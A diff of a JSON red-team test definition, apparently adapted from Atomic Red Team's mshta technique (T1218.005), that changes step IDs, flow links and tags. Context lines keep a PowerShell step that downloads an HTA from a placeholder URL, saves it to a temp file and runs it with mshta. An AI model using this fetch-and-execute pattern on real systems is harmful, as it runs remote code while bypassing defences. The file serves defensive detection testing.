@@ -7,7 +7,7 @@
   ],
   "steps": [
     {
-      "id": "361a53fd-9137-4b0d-aa67-062f6d21c0e7",
+      "id": "7f81a8e7-1c72-4737-b89a-68849ebc8461",
       "type": "execute-command",
       "data": {
         "command": "$var =Invoke-WebRequest \"#{hta_url}\"\n$var.content|out-file \"#{temp_file}\"\nmshta \"#{temp_file}\"\nstart-sleep -s 15\nstop-process -name \"calculator\" -Force\n",
@@ -16,7 +16,7 @@
       "elevation_required": false
     },
     {
-      "id": "dbd66089-0241-4bfd-83e6-b8f78c7f85f6",
+      "id": "7d4ca346-6afb-46b9-b20e-f339553d76fe",
       "type": "execute-command",
       "data": {
         "command": "remove-item \"#{temp_file}\" -ErrorAction Ignore\n",
@@ -27,19 +27,19 @@
   ],
   "flows": [
     {
-      "s": "361a53fd-9137-4b0d-aa67-062f6d21c0e7",
+      "s": "7f81a8e7-1c72-4737-b89a-68849ebc8461",
       "p": "on-success",
-      "o": "dbd66089-0241-4bfd-83e6-b8f78c7f85f6"
+      "o": "7d4ca346-6afb-46b9-b20e-f339553d76fe"
     },
     {
-      "s": "361a53fd-9137-4b0d-aa67-062f6d21c0e7",
+      "s": "7f81a8e7-1c72-4737-b89a-68849ebc8461",
       "p": "on-failure",
-      "o": "dbd66089-0241-4bfd-83e6-b8f78c7f85f6"
+      "o": "7d4ca346-6afb-46b9-b20e-f339553d76fe"
     }
   ],
   "tags": [
-    "T1218.005",
-    "atomic-red-team"
+    "T1218",
+    "T1218.005"
   ],
   "input_arguments": [
     {
